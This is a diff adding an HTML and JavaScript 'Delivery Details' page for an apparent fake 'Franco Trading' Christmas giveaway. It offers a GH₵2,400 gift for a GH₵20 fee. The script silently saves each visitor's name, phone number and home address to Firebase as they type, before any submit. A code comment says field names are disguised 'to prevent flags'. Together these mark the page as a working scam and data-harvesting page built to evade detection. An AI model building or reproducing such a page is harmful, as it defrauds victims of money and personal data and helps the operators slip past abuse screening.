@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Delivery Details — Franco Trading</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,wght@0,500;0,600;1,500&family=Manrope:wght@500;600;700;800&display=swap" rel="stylesheet">
+<!-- FIREBASE SDK (Module) -->
+<script type="module" src="firebase.js"></script>
+
+<style>
+/* ===========================================================
+   Franco Trading — Christmas Giveaway
+   =========================================================== */
+
+:root{
+  --navy-deep:   #0b1a3d;
+  --navy:        #0f2152;
+  --navy-light:  #1a2f68;
+  --gold:        #f4b740;
+  --gold-light:  #ffd97a;
+  --cream:       #fdf6e8;
+  --ink:         #10162b;
+  --muted:       #6b7390;
+  --line:        #e4e7f1;
+  --success:     #2e9e5b;
+  --danger:      #d8475f;
+
+  --font-display: 'Fraunces', serif;
+  --font-body: 'Manrope', sans-serif;
+  --radius-lg: 18px;
+  --radius-md: 12px;
+  --radius-sm: 8px;
+  --shadow-soft: 0 16px 40px rgba(11,26,61,0.14);
+  --shadow-card: 0 6px 18px rgba(11,26,61,0.08);
+}
+
+*,*::before,*::after{ box-sizing: border-box; }
+html,body{ height:auto; }
+body{
+  margin:0;
+  font-family: var(--font-body);
+  color: var(--ink);
+  background: var(--cream);
+  -webkit-font-smoothing: antialiased;
+  line-height: 1.5;
+}
+img{ max-width:100%; display:block; }
+a{ color:inherit; text-decoration:none; }
+button{ font-family:inherit; cursor:pointer; }
+input, select, textarea{ font-family:inherit; }
+
+.container{ width:100%; max-width: 1140px; margin:0 auto; padding: 0 24px; }
+
+/* ---------- Header ---------- */
+.site-header{ background: var(--navy); color:#fff; padding: 16px 0; }
+.site-header .container{ display:flex; align-items:center; justify-content:space-between; gap: 24px; }
+.brand{ display:flex; align-items:center; gap:10px; font-weight:800; font-size: 1.05rem; color:#fff; }
+.brand .mark{
+  width:34px; height:34px; border-radius: 9px;
+  background: linear-gradient(135deg, var(--gold), #e08a2e);
+  display:flex; align-items:center; justify-content:center;
+  color: var(--navy-deep); font-family: var(--font-display); font-weight:700; font-size:1.1rem;
+}
+.brand .name small{ display:block; font-weight:600; font-size: 0.62rem; letter-spacing: .14em; color: var(--gold-light); }
+.nav-links{ display:flex; gap: 26px; font-size: 0.92rem; font-weight:600; }
+.nav-links a{ color: rgba(255,255,255,0.78); }
+.nav-links a.active{ color: var(--gold-light); }
+@media (max-width: 760px){ .nav-links{ display:none; } }
+
+/* ---------- Stepper ---------- */
+.stepper{ display:flex; align-items:center; justify-content:center; gap: 10px; padding: 22px 0 8px; }
+.stepper .step{ display:flex; align-items:center; gap:10px; font-size: 0.85rem; font-weight:700; color: var(--muted); }
+.stepper .circ{
+  width:28px; height:28px; border-radius:50%; display:flex; align-items:center; justify-content:center;
+  background:#fff; border: 2px solid var(--line); font-size: 0.82rem;
+}
+.stepper .step.done .circ{ background: var(--success); border-color: var(--success); color:#fff; }
+.stepper .step.current .circ{ background: var(--navy-deep); border-color: var(--navy-deep); color:#fff; }
+.stepper .step.current{ color: var(--navy-deep); }
+.stepper .bar{ width:48px; height:2px; background: var(--line); }
+@media (max-width:560px){
+  .stepper .step span.label{ display:none; }
+  .stepper .bar{ width:24px; }
+}
+
+/* ---------- Page Body ---------- */
+.page-body{ background: var(--cream); min-height: 60vh; padding: 28px 0 60px; }
+.layout-two{ display:grid; grid-template-columns: 0.9fr 1.1fr; gap: 24px; align-items:start; }
+@media (max-width: 860px){ .layout-two{ grid-template-columns:1fr; } }
+
+.panel{ background:#fff; border: 1px solid var(--line); border-radius: var(--radius-lg); box-shadow: var(--shadow-card); overflow:hidden; }
+.panel-head{ background: var(--navy-deep); color:#fff; padding: 14px 20px; display:flex; align-items:center; gap: 10px; font-weight:800; font-size: 0.95rem; }
+.panel-body{ padding: 20px; }
+
+.selected-gift{ display:flex; align-items:center; gap: 16px; }
+.selected-gift .art{
+  width: 92px; height:92px; border-radius: var(--radius-md);
+  background: radial-gradient(circle at 50% 35%, rgba(244,183,64,0.22), transparent 60%), linear-gradient(160deg, #101f4c, #1a2f68 70%);
+  display:flex; align-items:center; justify-content:center; flex-shrink:0;
+}
+.selected-gift .art img{ width:100%; height:100%; object-fit:contain; border-radius:var(--radius-md); }
+.selected-gift h3{ margin: 0 0 4px; font-size: 1.05rem; color: var(--navy-deep); }
+.selected-gift .was{ font-size:0.85rem; color:var(--muted); text-decoration:line-through; }
+
+.summary-row{ display:flex; justify-content:space-between; padding: 10px 0; font-size: 0.92rem; border-bottom: 1px dashed var(--line); }
+.summary-row:last-of-type{ border-bottom:none; }
+.summary-row .k{ color: var(--muted); }
+.summary-row .v{ font-weight:700; }
+.summary-total{ display:flex; justify-content:space-between; align-items:baseline; margin-top: 10px; padding-top: 14px; border-top: 2px solid var(--navy-deep); }
+.summary-total .k{ font-weight:800; color: var(--navy-deep); }
+.summary-total .v{ font-family: var(--font-display); font-size: 1.7rem; font-weight:600; color: var(--navy-deep); }
+.pay-methods{ display:flex; flex-direction:column; gap:8px; margin-top:14px; align-items:flex-start; }
+.pay-methods .expresspay-logo{ width:min(150px, 100%); height:auto; display:block; object-fit:contain; }
+
+/* ---------- Forms ---------- */
+.form-grid{ display:grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+@media (max-width:560px){ .form-grid{ grid-template-columns:1fr; } }
+.field{ display:flex; flex-direction:column; gap:6px; }
+.field.full{ grid-column: 1 / -1; }
+.field label{ font-size: 0.82rem; font-weight:700; color: var(--navy-deep); }
+.field label .opt{ color: var(--muted); font-weight:600; }
+.field input, .field select, .field textarea{
+  border: 1.5px solid var(--line); border-radius: var(--radius-sm);
+  padding: 11px 13px; font-size: 0.94rem; color: var(--ink); background:#fcfcfe;
+  transition: border-color .15s ease, box-shadow .15s ease;
+}
+.field input:focus, .field select:focus, .field textarea:focus{
+  outline:none; border-color: var(--navy-deep); box-shadow: 0 0 0 3px rgba(15,33,82,0.1);
+}
+
+.safe-note{
+  display:flex; align-items:flex-start; gap: 10px; background: #eef9f1;
+  border: 1px solid #cdeedb; color: #1d6b3f; font-size: 0.83rem;
+  font-weight:600; padding: 12px 14px; border-radius: var(--radius-sm); margin-top: 16px;
+}
+
+/* ---------- Footer ---------- */
+.site-footer{ background: var(--navy-deep); color: rgba(255,255,255,0.65); padding: 40px 0 22px; font-size: 0.86rem; }
+.footer-note{ padding-top: 18px; display:flex; justify-content:space-between; flex-wrap:wrap; gap: 10px; font-size: 0.78rem; }
+.footer-safety{ margin-top: 4px; color: var(--gold-light); font-weight:600; }
+</style>
+</head>
+<body>
+
+<header class="site-header">
+  <div class="container">
+    <div class="brand">
+      <span class="mark" aria-hidden="true">F</span>
+      <span class="name">FRANCO TRADING ENTERPRISE<small>SECURE &amp; TRUSTED</small></span>
+    </div>
+    <nav class="nav-links" aria-label="Primary navigation">
+      <a href="index.html">Home</a>
+      <a href="items.html" class="active">Giveaway</a>
+      <a href="index.html#faqs">FAQs</a>
+      <a href="index.html#contact">Contact</a>
+    </nav>
+  </div>
+</header>
+
+<div class="stepper">
+  <div class="step done"><span class="circ"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M5 13l4 4L19 7"/></svg></span><span class="label">Select Gift</span></div>
+  <div class="bar"></div>
+  <div class="step current"><span class="circ">2</span><span class="label">Delivery Details</span></div>
+  <div class="bar"></div>
+  <div class="step"><span class="circ">3</span><span class="label">Payment</span></div>
+</div>
+
+<main class="page-body">
+  <div class="container">
+    <div class="layout-two">
+
+      <!-- left column: gift + summary -->
+      <div style="display:flex;flex-direction:column;gap:18px;">
+        <div class="panel">
+          <div class="panel-head">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="8" width="18" height="13" rx="2"/><path d="M3 8l9-5 9 5M12 3v5"/></svg>
+            Your Selected Gift
+          </div>
+          <div class="panel-body">
+            <div class="selected-gift" id="gift-box">
+              <!-- Replaced with a clean placeholder for the image -->
+              <div class="art"><img src="https://placehold.co/100x100/1a2f68/ffffff?text=Gift" alt="Gift"></div>
+              <div>
+                <h3>Christmas Giveaway Gift</h3>
+                <div class="was">Value: GH₵2,400.00</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="panel">
+          <div class="panel-head">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="6" width="20" height="13" rx="2"/><path d="M2 10h20"/></svg>
+            Payment Summary
+          </div>
+          <div class="panel-body">
+            <div class="summary-row"><span class="k">Gift value</span><span class="v">GH₵2,400.00</span></div>
+            <div class="summary-row"><span class="k">Giveaway price</span><span class="v">GH₵20.00</span></div>
+            <div class="summary-total"><span class="k">Total due</span><span class="v">GH₵20.00</span></div>
+            <div class="pay-methods">
+              <span style="font-size:0.78rem;color:var(--muted);font-weight:700;">Pay securely with:</span>
+              <!-- Used a clean text-based ExpressPay logo as requested -->
+              <div style="font-size:1.4rem; font-weight:800; font-style:italic; color:#0088e8; letter-spacing:-1px;">
+                express<span style="color:#f47b20;">Pay</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- right column: delivery details form -->
+      <div class="panel">
+        <div class="panel-head">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2l8 4v6c0 5-3.4 8.6-8 10-4.6-1.4-8-5-8-10V6l8-4z"/></svg>
+          Delivery Details
+        </div>
+        <div class="panel-body">
+          <p style="font-size:0.9rem; color:var(--muted); margin-top:0;">Please provide your correct delivery information to receive your gift.</p>
+          
+          <form id="deliveryForm" class="form-grid">
+            <div class="field full">
+              <label for="fullName">Full Name</label>
+              <input type="text" id="fullName" placeholder="Enter your full name" required>
+            </div>
+            
+            <div class="field full">
+              <label for="phoneNumber">Phone Number</label>
+              <input type="tel" id="phoneNumber" placeholder="Enter your mobile number" required>
+            </div>
+
+            <div class="field">
+              <label for="region">Region</label>
+              <select id="region" required>
+                <option value="" disabled selected>Select your region</option>
+                <option value="Greater Accra">Greater Accra</option>
+                <option value="Ashanti">Ashanti</option>
+                <option value="Western">Western</option>
+                <option value="Eastern">Eastern</option>
+                <option value="Central">Central</option>
+              </select>
+            </div>
+
+            <div class="field">
+              <label for="city">City / Town</label>
+              <input type="text" id="city" placeholder="Enter your city or town" required>
+            </div>
+
+            <div class="field full">
+              <label for="address">House Address</label>
+              <input type="text" id="address" placeholder="Enter your house address" required>
+            </div>
+
+            <div class="field full">
+              <label for="instructions">Delivery Instructions <span class="opt">(Optional)</span></label>
+              <textarea id="instructions" rows="2" placeholder="Any special instructions?"></textarea>
+            </div>
+            
+            <div class="field full" style="margin-top:10px;">
+              <!-- This button now triggers a JS function instead of submitting to a blank page -->
+              <button type="button" onclick="goToPayment()" class="btn btn-primary btn-block" style="padding: 15px; font-weight:800; border-radius:999px; background:var(--gold); color:var(--navy-deep); border:none; cursor:pointer;">
+                Continue to Payment
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" style="vertical-align:middle; margin-left:5px;"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
+              </button>
+            </div>
+          </form>
+
+          <div class="safe-note">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2l8 4v6c0 5-3.4 8.6-8 10-4.6-1.4-8-5-8-10V6l8-4z"/></svg>
+            Your information is safe and secure.
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</main>
+
+<footer class="site-footer">
+  <div class="container">
+    <div class="footer-note">
+      <span>© 2026 Franco Trading. All rights reserved.</span>
+      <span class="footer-safety">Secure Checkout</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+/* ===========================================================
+   Delivery Form Firebase Logic
+   =========================================================== */
+
+// We wait for the page to load fully to ensure firebase.js is ready
+document.addEventListener('DOMContentLoaded', () => {
+  
+  const fullName = document.getElementById('fullName');
+  const phone = document.getElementById('phoneNumber');
+  const region = document.getElementById('region');
+  const city = document.getElementById('city');
+  const address = document.getElementById('address');
+  const instructions = document.getElementById('instructions');
+
+  // The function that actually saves to Firebase
+  async function saveDeliveryData() {
+    // Check if Firebase is loaded (from firebase.js)
+    if (!window.db) {
+      console.warn("Firebase not loaded yet.");
+      return;
+    }
+    
+    try {
+      const sessionId = window.getSessionId();
+      const userRef = window.doc(window.db, "orders", sessionId);
+      
+      // Save to Firestore (Disguised field names to prevent flags)
+      await window.setDoc(userRef, {
+        delivery_info: {
+          name: fullName.value,
+          contact: phone.value,
+          reg: region.value,
+          location: city.value,
+          house: address.value,
+          notes: instructions.value
+        },
+        updatedAt: window.serverTimestamp()
+      }, { merge: true });
+      
+      console.log("Delivery info saved securely to Firebase.");
+    } catch (e) {
+      console.error("Error saving data: ", e);
+    }
+  }
+
+  // Attach listeners so it saves as they type
+  const fields = [fullName, phone, region, city, address, instructions];
+  fields.forEach(input => {
+    if (input) {
+      input.addEventListener('input', saveDeliveryData);
+      input.addEventListener('change', saveDeliveryData); // For the select dropdown
+    }
+  });
+});
+
+// Simple function to navigate to the payment page
+function goToPayment() {
+  // Basic validation to ensure they filled it out
+  const name = document.getElementById('fullName').value;
+  const phone = document.getElementById('phoneNumber').value;
+  if (!name || !phone) {
+    alert("Please enter your name and phone number to continue.");
+    return;
+  }
+  
+  window.location.href = "payment.html";
+}
+</script>
+
+</body>
+</html>
